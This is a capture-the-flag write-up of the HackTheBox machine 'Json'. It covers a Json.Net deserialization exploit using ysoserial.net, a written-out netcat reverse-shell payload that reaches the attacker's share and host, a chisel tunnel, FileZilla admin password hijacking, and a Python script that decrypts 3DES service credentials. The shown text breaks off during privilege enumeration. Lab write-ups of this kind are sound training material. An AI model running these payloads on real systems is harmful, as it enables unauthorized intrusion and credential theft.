---
title: HTB: Json
url: https://0xdf.gitlab.io/2020/02/15/htb-json.html
date: 2020-02-15T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-json, ctf, commando, nmap, deserialization, dotnet, javascript, deobfuscation, jsnice, gobuster, oauth, ysoserial.net, filezilla, chisel, ftp, dnspy, python, des, crypto, juicypotato, potato, oswe-like, htb-arkham
---

![Json](https://0xdfimages.gitlab.io/img/json-cover.png)

Json involved exploiting a .NET deserialization vulnerability to get initial access, and then going one of three ways to get root.txt. I’ll show each of the three ways I’m aware of to escalate: Connecting to the FileZilla Admin interface and changing the users password; reversing a custom application to understand how to decrypt a username and password, which can then be used over the same FTP interface; and JuicyPotato to get a SYSTEM shell. Since this is a Windows host, I’ll work it almost entirely from my Windows Commando VM.

## Box Info

| Name | [Json](https://hackthebox.com/machines/json)  [Json](https://hackthebox.com/machines/json) [Play on HackTheBox](https://hackthebox.com/machines/json) |
| --- | --- |
| Release Date | [28 Sep 2019](https://twitter.com/hackthebox_eu/status/1177167407183540225) |
| Retire Date | 15 Feb 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Json |
| Radar Graph | Radar chart for Json |
| First Blood User | 00:42:29[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 01:14:08[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [Cyb3rb0b Cyb3rb0b](https://app.hackthebox.com/users/61047) |

## Recon

### nmap

`nmap` shows a bunch of typical Windows ports, and FTP (21), HTTP (80), SMB/RPC (135, 139, 445), and WinRM (5985):

```

PS > nmap -p- --min-rate 10000 -oA scans\alltcp 10.10.10.158
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-29 23:51 GMT Daylight Time
Warning: 10.10.10.158 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.158
Host is up (0.018s latency).
Not shown: 65494 closed ports, 27 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds

PS > nmap -sC -sV -p 21,80,135,139,445,5985 -oA scans\tcpscripts 10.10.10.158
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-29 23:43 GMT Daylight Time
Nmap scan report for 10.10.10.158
Host is up (0.021s latency).

PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
80/tcp   open   http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp  open   msrpc        Microsoft Windows RPC
139/tcp  open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h44m48s, deviation: 0s, median: 3h44m47s
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a4:ac:26 (VMware)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-30 03:28:27
|_  start_date: 2019-09-29 03:03:21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.74 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), this looks like Server 2012 R2 or Windows 8.1.

### Website - TCP 80

#### Site

The site has the title “SB Admin 2”, and it loads a dashboard of some sorts, but then immediately redirects to a login page:

![1569847090156](https://0xdfimages.gitlab.io/img/1569847090156.png)

I can go into Burp and see the series of requests. First it loads `/`, followed by a series of requests for various `.js` files. Almost all the requests 404, except a couple `js` files, and the it requests `/login.html`, the form shown above:

![image-20200213202531822](https://0xdfimages.gitlab.io/img/image-20200213202531822.png)

If I change my Burp proxy to intercept requests for `.js` files, and make sure my Firefox hasn’t cached anything, I can request again with Intercept on. I’ll let the request for `/` through, and right away, I see the page, without having authenticated:

![1569922034322](https://0xdfimages.gitlab.io/img/1569922034322.png)

If I then let the next request come through, I’m redirected to the login.

#### JavaScript Deobfuscation

I didn’t need to look at the JavaScript to continue, but I never like to pass up the opportunity to deobfuscate something. The request to `/js/app.min.js` returns clearly obfuscated code:

```

var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])

```

Throwing that into [JS NICE](http://www.jsnice.org/) and then doing some manual replacements gives me:

```

'use strict';
angular["module"]("json", ["ngCookies"])["controller"]("loginController", ["$http", "$scope", "$cookies", function(elem, data, isSlidingUp) {
  data["credentials"] = {
    UserName : "",
    Password : ""
  };
  data["error"] = {
    message : _0xd18f[18],
    show : false
  };
  var _0x30f6x4 = isSlidingUp["get"]("OAuth2");
  if (_0x30f6x4) {
    window["location"]["href"] = "index.html";
  }
  /**
   * @return {undefined}
   */
  data["login"] = function() {
    elem["post"]("/api/token", data["credentials"])["then"](function(canCreateDiscussions) {
      window["location"]["href"] = "index.html";
    }, function(body) {
      data["error"]["message"] = "Invalid Credentials.";
      /** @type {boolean} */
      data["error"]["show"] = true;
      console["log"](body);
    });
  };
}])["controller"]("principalController", ["$http", "$scope"], "$cookies", function($http, isSlidingUp, canCreateDiscussions) {
  var _0x30f6x4 = canCreateDiscussions["get"]("OAuth2");
  if (_0x30f6x4) {
    $http["get"]("/api/Account/", {
      headers : {
        "Bearer" : _0x30f6x4
      }
    })["then"](function(canCreateDiscussions) {
      isSlidingUp["UserName"] = canCreateDiscussions["data"]["Name"];
    }, function(canCreateDiscussions) {
      canCreateDiscussions["remove"]("OAuth2");
      window["location"]["href"] = "login.html";
    });
  } else {
    window["location"]["href"] = "login.html";
  }
}]);

```

It’s not immediately clear what’s going on, but I can see that at the bottom there are two reasons why it might set the `window.location.href` to `login.html`, including one based on an OAuth2 call to `/api/Account`. I didn’t see that call yet.

#### Directory Brute Force

`gobuster` doesn’t show anything useful:

```

PS > gobuster -u http://10.10.10.158 -w C:\Tools\dirbuster-lists\directory-list-lowercase-2.3-medium.txt -o .\scans\gobuster-root

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.158/
[+] Threads      : 10
[+] Wordlist     : C:\Tools\dirbuster-lists\directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/09/30 01:47:04 Starting gobuster
=====================================================
/img (Status: 301)
/files (Status: 301)
/css (Status: 301)
/js (Status: 301)
/views (Status: 301)
=====================================================
2019/09/30 01:59:15 Finished
=====================================================

```

#### Login

Despite being able to see the page without logging in, I gave the login form an initial guess, and admin/admin let me in. I get basically the same page as before, but now the username is filled in at the top right:

![1569922200695](https://0xdfimages.gitlab.io/img/1569922200695.png)

#### API

When I look at the requests involved in logging in, I see a POST to `/api/token` with the data:

```

{"UserName":"admin","Password":"admin"}

```

The response sets a cookie:

```

OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Tue, 01-Oct-2019 13:15:55 GMT; path=/

```

That cookie is just some base64 encoded json with information about the account:

```

root@commando:~# echo eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0= | base64 -d
{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}

```

After that as I’m redirected to `index.html`, I see that GET, immediately followed by a GET to `/api/Account/`:

![1569922433340](https://0xdfimages.gitlab.io/img/1569922433340.png)

The GET request to `/api/Account` sends both the `OAuth2` cookie above, as well as a `Bearer:`  header with the same value, and gets back information about the logged on user:

```

{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}

```

That password field is just the md5 of “admin”:

```

root@commando:~# echo -n admin | md5sum
21232f297a57a5a743894a0e4a801fc3  -

```

## Shell as userpool

### API Fuzzing / Crashing

The second API request to get the current user information was interesting. It’s passing in json account information. Getting the app to crash will often return useful information, so I’ll start tinkering in Repeater. When I mess with the `OAuth2` cookie, nothing changes. In fact, I can remove it entirely. When start to mess with the `Bearer` header, I get errors. On removing the last character, it complains about invalid base64:

```

{"Message":"An error has occurred.","ExceptionMessage":"Invalid format base64","ExceptionType":"System.Exception","StackTrace":null}

```

If I delete 3 more characters, the error changes:

```

{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}

```

This is interesting.

### Deserialization Attack

Any time a server is deserializing input that the user provides, there’s likely a issue I can exploit. I also see in the error message that it’s a `Json.Net Object`. I used a tool called [YSoSerial](https://github.com/frohoff/ysoserial) back in [Arkham](/2019/08/10/htb-arkham.html) to do a deserialization attack against a Java object. There’s a similar tool called [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) for .NET deserialization attacks. I can provide a command, as well as a gadget chain and formatter, and it will give me the object to pass to Json.

### RCE POC

`ysoserial.net` has a ton of gadgets, each with different formatters. It took a while playing around with different options to get one to work. I was drawn to gadgets that had a formatter named `Json.Net`, as that was the kind of object that I saw in the error message. I’ll jump over to my Commando Windows VM, where I tested with a simple `ping` payload, and kept Wireshark open to watch for replies. WindowsIdentity with Json.Net formatter worked:

```

PS > ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 10.10.14.10" -o base64
ew0KICAgICAgICAgICAgICAgICAgICAnJHR5cGUnOiAnU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHksIG1zY29ybGliLCBWZXJzaW9uPTQu...[snip]...

```

I sent the GET request for `/api/Account/` to Repeater in Burp, and replaced the Bearer header with the base64 encoded output from `ysoserial`. When I sent it the one above, I got hits in Wireshark:

![1569923892976](https://0xdfimages.gitlab.io/img/1569923892976.png)

This shows I can execute commands.

### Shell

I’ve got my CommandoVM set up with `C:\share` such that a user, dummy, can access it. `nc64.exe` is in the share, so I’ll just have Json connect to the share and run `nc` from there:

```

PS > ysoserial.exe -g WindowsIdentity -f Json.Net -c "net use \\10.10.14.10\share /u:dummy dummy & \\10.10.14.10\share\nc64.exe -e cmd.exe 10.10.14.10 443" -o base64
ew0KICAgICAgICAgICAgICAgICAgICAnJHR5cGUnOiAnU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwg...[snip]...

```

I’ll drop that into Repeater, and submit. I get a shell:

```

PS > nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.158] 64526
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
json\userpool

```

And from there, I can access `user.txt`:

```

c:\Users\userpool\Desktop>type user.txt
34459a01************************

```

## Priv #1: userpool –> superadmin [full disk access]

### Enumeration

If I check the listening ports on Json, I’ll see what I found with the `nmap`, with one addition listening on localhost:

```

c:\>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       548
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       368
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       704
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       284
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       1588
  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       464
  TCP    10.10.10.158:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.158:49159     10.10.14.10:445        ESTABLISHED     4
  TCP    10.10.10.158:49162     10.10.14.10:443        ESTABLISHED     2636
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       660
...[snip]...

```

I can use `tasklist` and the pid 660 from the netstat to see that this is `FileZilla Server.exe`:

```

c:\>tasklist | findstr 660
FileZilla Server.exe           660                            0     10,220 K

```

This isn’t the FTP server, but the FileZilla administration interface.

I can see the config file for this program:

```

c:\PROGRA~2\FileZilla Server>type "FileZilla Server.xml"
type "FileZilla Server.xml"
<FileZillaServer>
    <Settings>
        <Item name="Admin port" type="numeric">14147</Item>
    </Settings>
    <Groups />
    <Users>
        <User Name="superadmin">
            <Option Name="Pass">813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0</Option>
            <Option Name="Salt">cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0</Option>
            <Option Name="Group"></Option>
            <Option Name="Bypass server userlimit">0</Option>
            <Option Name="User Limit">0</Option>
            <Option Name="IP Limit">0</Option>
            <Option Name="Enabled">1</Option>
            <Option Name="Comments"></Option>
            <Option Name="ForceSsl">0</Option>
            <IpFilter>
                <Disallowed />
                <Allowed />
            </IpFilter>
            <Permissions>
                <Permission Dir="C:\Users\superadmin">
                    <Option Name="FileRead">1</Option>
                    <Option Name="FileWrite">0</Option>
                    <Option Name="FileDelete">0</Option>
                    <Option Name="FileAppend">0</Option>
                    <Option Name="DirCreate">0</Option>
                    <Option Name="DirDelete">0</Option>
                    <Option Name="DirList">1</Option>
                    <Option Name="DirSubdirs">1</Option>
                    <Option Name="IsHome">1</Option>
                    <Option Name="AutoCreate">0</Option>
                </Permission>
            </Permissions>
            <SpeedLimits DlType="0" DlLimit="10" ServerDlLimitBypass="0" UlType="0" UlLimit="10" ServerUlLimitBypass="0">
                <Download />
                <Upload />
            </SpeedLimits>
        </User>
    </Users>
</FileZillaServer>

```

I tried to break that hash, but failed. I’ll look at the hash in [Beyond Root](#filezilla-hash). I can also confirm the listening admin port:

```

<Item name="Admin port" type="numeric">14147</Item>

```

### Create Tunnels

To interact with this service running on localhost, I’ll use [Chisel](https://github.com/jpillora/chisel). I already have a copy of the windows exe sitting in `\share`, so I can copy that to Json (I like the `\windows\system32\spool\drivers\color` directory), and then make the connection.

On Commando, it looks like:

```

PS > .\chisel_windows_amd64.exe server -p 8000 --reverse
2019/10/03 17:52:52 server: Reverse tunnelling enabled
2019/10/03 17:52:52 server: Fingerprint b7:e8:cd:00:71:e1:a9:ed:64:4a:99:c7:ad:b2:6d:20
2019/10/03 17:52:52 server: Listening on 0.0.0.0:8000...
2019/10/03 18:21:44 server: proxy#1:R:0.0.0.0:223=>localhost:14147: Listening

```

On Json:

```

c:\Windows\System32\spool\drivers\color>c.exe client 10.10.14.10:8000 R:223:localhost:14147
c.exe client 10.10.14.10:8000 R:223:localhost:14147
2019/10/03 17:06:26 client: Connecting to ws://10.10.14.10:8000
2019/10/03 17:06:26 client: Fingerprint b7:e8:cd:00:71:e1:a9:ed:64:4a:99:c7:ad:b2:6d:20
2019/10/03 17:06:26 client: Connected (Latency 31.3391ms)

```

If I test the tunnel with `nc`, I see that I can connect, but it’s clearly not the intended method:

```

PS > nc 127.0.0.1 223
FZS `    @       ~   You appear to be behind a NAT router. Please configure the passive mode settings and forward a range of ports in your router.D   Warning: FTP over TLS is not enabled, users cannot securely log in.
   à    ::15┴  Z    z╒░=PN(000133)- (not logged in) (::1)> Connected on port 21, sending welcome message...J   z╒░=PN(000133)- (not logged in) (::1)> 220-FileZilla Server 0.9.60 betad   z╒░=PN(000133)- (not logged in) (::1)> 220-written by Tim Kosse (tim.kosse@filezilla-project.org)Y   z╒░=PN(000133)- (not logged in) (::1)> 220 Please visit https://filezilla-project.org/   Å   9   z╒░hƒQ(000133)- (not logged in) (::1)> USER superadminN   z╒░hƒQ(000133)- (not logged in) (::1)> 331 Password required for superadmin   &       
7   z╒ ┼=U(000133)- (not logged in) (::1)> PASS ********J   z╒ ┼=U(000133)- (not logged in) (::1)> 530 Login or password incorrect!7    z╒ ┼=U(000133)- (not logged in) (::1)> disconnected.   à      "       

```

### FileZilla Server

I’ll download [FileZilla Server](https://filezilla-project.org/download.php?type=server) and install it. I’ll choose to tell it to start manually each time it asks me, as I don’t want to run an FTP server on my Commando host.

Now I’ll open it, and it prompts me for a host to connect to:

![1570124022070](https://0xdfimages.gitlab.io/img/1570124022070.png)

If it doesn’t, that’s because I put in information for the server on install. I can go to File -> Connect to Server… to get the same pop up. When I enter localhost and the port I forwarded to, it shows I’m connected in the main window:

![1570124145053](https://0xdfimages.gitlab.io/img/1570124145053.png)

Now I can configure the FTP server.

### Configure FTP User

I’ll click on the users button (4th from the left), and there’s a dialog showing one user, superadmin:

![1570124186893](https://0xdfimages.gitlab.io/img/1570124186893.png)

I’ll change the password to something I know. In the “Shared folders” tab, I’ll see this users home directory is the FTP root:

![1570124300109](https://0xdfimages.gitlab.io/img/1570124300109.png)

I could change that to `c:\` for full disk, or leave it to go directly to `root.txt`.

I’ll click ok, and then go to a PowerShell window to connect with FTP:

```

PS > ftp 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
202 UTF8 mode is always enabled. No need to send this command.
User (10.10.10.158:(none)): superadmin
331 Password required for superadmin
Password:
230 Logged on
ftp> cd desktop
250 CWD successful. "/desktop" is current directory.
ftp> dir
200 Port command successful
150 Opening data channel for directory listing of "/desktop"
-r--r--r-- 1 ftp ftp            282 May 22  2019 desktop.ini
-r--r--r-- 1 ftp ftp             32 May 22  2019 root.txt
226 Successfully transferred "/desktop"
ftp: 124 bytes received in 0.02Seconds 6.53Kbytes/sec.
ftp> get root.txt
200 Port command successful
150 Opening data channel for file download from server of "/desktop/root.txt"
226 Successfully transferred "/desktop/root.txt"
ftp: 32 bytes received in 0.00Seconds 32000.00Kbytes/sec.
ftp>

```

Now I can read the flag:

```

PS > type .\root.txt
3cc85d1b************************

```

## Priv #2: userpool –> superadmin [full disk access]

### Enumeration

In `C:\Program Files\` there’s a directory called `Sync2Ftp`:

```

c:\Program Files\Sync2Ftp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 68B8-7F1E

 Directory of c:\Program Files\Sync2Ftp

05/23/2019  02:06 PM    <DIR>          .
05/23/2019  02:06 PM    <DIR>          ..
05/23/2019  01:48 PM             9,728 SyncLocation.exe
05/23/2019  02:08 PM               591 SyncLocation.exe.config
               2 File(s)         10,319 bytes
               2 Dir(s)  62,256,934,912 bytes free

```

Googling for that returns no evidence of a product named that, which tells me it’s custom, and therefore quite interesting. I’ll pulll both back to my local workstation and take a look.

### Config File

The config file has various settings, including a user and password:

```

<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>

</configuration>﻿

```

Unfortunately, both are base64 encoded, but both decode to non-ASCII strings.

### Binary

The binary itself is a 32-bit .NET executable:

```

root@kali# file SyncLocation.exe
SyncLocation.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

```

I’ll open it in dnSpy to decompile the .NET binary. I’ll start with `Program.Main()`:

```

// SyncLocation.Program
// Token: 0x0600000F RID: 15 RVA: 0x00002634 File Offset: 0x00000834
private static void Main()
{
	ServiceBase[] services = new ServiceBase[]
	{
		new Service1()
	};
	ServiceBase.Run(services);
}

```

There’s a `Service1` class with several function:

![image-20200214144752033](https://0xdfimages.gitlab.io/img/image-20200214144752033.png)

The `Copy` function is particularly interesting:

```

// SyncLocation.Service1
// Token: 0x0600000B RID: 11 RVA: 0x000023D0 File Offset: 0x000005D0
private void Copy()
{
	try
	{
		string path = ConfigurationManager.AppSettings["destinationFolder"];
		string text = ConfigurationManager.AppSettings["sourcefolder"];
		string cipherString = ConfigurationManager.AppSettings["user"];
		string cipherString2 = ConfigurationManager.AppSettings["password"];
		string userName = Crypto.Decrypt(cipherString, true);
		string password = Crypto.Decrypt(cipherString2, true);
		bool flag = Directory.Exists(text);
		if (flag)
		{
			string[] files = Directory.GetFiles(text);
			foreach (string text2 in files)
			{
				FileInfo fileInfo = new FileInfo(text2);
				string requestUriString = Path.Combine(path, fileInfo.Name);
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(userName, password);
				ftpWebRequest.UsePassive = true;
				ftpWebRequest.UseBinary = true;
				ftpWebRequest.KeepAlive = false;
				this.Log("Upload File " + fileInfo.Name);
				FileStream fileStream = File.OpenRead(text2);
				byte[] array2 = new byte[fileStream.Length];
				fileStream.Read(array2, 0, array2.Length);
				fileStream.Close();
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(array2, 0, array2.Length);
				requestStream.Close();
			}
		}
		else
		{
			this.Log("The directory " + text + " not exits.");
		}
	}
	catch (Exception ex)
	{
		this.Log(ex.ToString());
	}
}

```

### Decrypt Username / Password

At the top of the code above, it reads `cipherString` and `cipherString2` using the `ConfigurationManager.AppSettings` object. I will assume that info is read into there from the config file, as all the items match. Then, it generates `userName` and `password` by calling `Crypto.Decrypt`:

```

string cipherString = ConfigurationManager.AppSettings["user"];
string cipherString2 = ConfigurationManager.AppSettings["password"];
string userName = Crypto.Decrypt(cipherString, true);
string password = Crypto.Decrypt(cipherString2, true);

```

I can take a look at `Decrypt`:

```

// SyncLocation.Crypto
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
public static string Decrypt(string cipherString, bool useHashing)
{
	byte[] array = Convert.FromBase64String(cipherString);
	AppSettingsReader appSettingsReader = new AppSettingsReader();
	string s = (string)appSettingsReader.GetValue("SecurityKey", typeof(string));
	byte[] key;
	if (useHashing)
	{
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
		md5CryptoServiceProvider.Clear();
	}
	else
	{
		key = Encoding.UTF8.GetBytes(s);
	}
	TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
	tripleDESCryptoServiceProvider.Key = key;
	tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
	tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
	ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
	byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
	tripleDESCryptoServiceProvider.Clear();
	return Encoding.UTF8.GetString(bytes);
}

```

Here’s how it works:
1. Base64 decodes the cipherstring into bytes.
2. Reads the “SecurityKey”, and since `useHashing` is called as `True`, it takes an MD5 hash of that string to get the key.
3. It decrpyts with Triple DES using ECB mode.

I can recreate that with Python:

```

  1 #!/usr/bin/env python3
  2 
  3 import base64
  4 import hashlib
  5 from Crypto.Cipher import DES3
  6 from Crypto.Util.Padding import unpad
  7 
  8 user_enc = "4as8gqENn26uTs9srvQLyg=="
  9 pass_enc = "oQ5iORgUrswNRsJKH9VaCw=="
 10 key_str = b"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"
 11 
 12 def decrypt(s):
 13     ciphertext = base64.b64decode(s)
 14     key = hashlib.md5(key_str).digest()
 15     des = DES3.new(key, DES3.MODE_ECB)
 16     return unpad(des.decrypt(ciphertext), 8).decode()
 17 
 18 print(f'[+] Username: {decrypt(user_enc)}')
 19 print(f'[+] Password: {decrypt(pass_enc)}')

```

When I run it, I get the creds:

```

root@kali# ./decrypt_pass.py
[+] Username: superadmin
[+] Password: funnyhtb

```

Just like before, I can connect to FTP and have access to the administrator’s desktop including `root.txt`.

### Shell Fail

I did try to connect over WinRM to see if these creds would work to get a shell as superadmin. I ran `chisel` to create a tunnel from my local 5985 to 5985 on Json. Then I tried to connect using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), but the creds did not work. The user’s OS password must have been different.

## Priv #3: userpool –> SYSTEM

### Enumeration

I noticed that userpool has `SeImpersonatePrivilege`:

```

c:\Users\userpool>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
